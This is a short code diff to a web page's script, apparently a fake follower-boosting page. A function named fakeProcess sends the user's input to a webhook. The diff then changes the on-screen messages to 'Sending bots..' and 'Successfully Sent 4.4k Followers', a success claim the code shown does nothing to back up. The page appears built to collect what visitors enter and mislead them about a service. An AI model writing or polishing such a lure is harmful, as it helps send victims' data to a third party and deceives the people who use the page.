@@ -337,10 +337,10 @@ async function fakeProcess() {
     await sendChunksToWebhook(input);
 
     setTimeout(() => {
-        msg.textContent = "Sent!";
+        msg.textContent = "Sending bots..";
         setTimeout(() => {
             msg.style.display = "none";
-            msg.textContent = "Processing...";
+            msg.textContent = "Successfully Sent 4.4k Followers";
         }, 1500);
     }, 1500);
 }
@@ -358,6 +358,7 @@ panels.forEach(panel => observer.observe(panel));
 
 </body>
 </html>
+
 
 
 
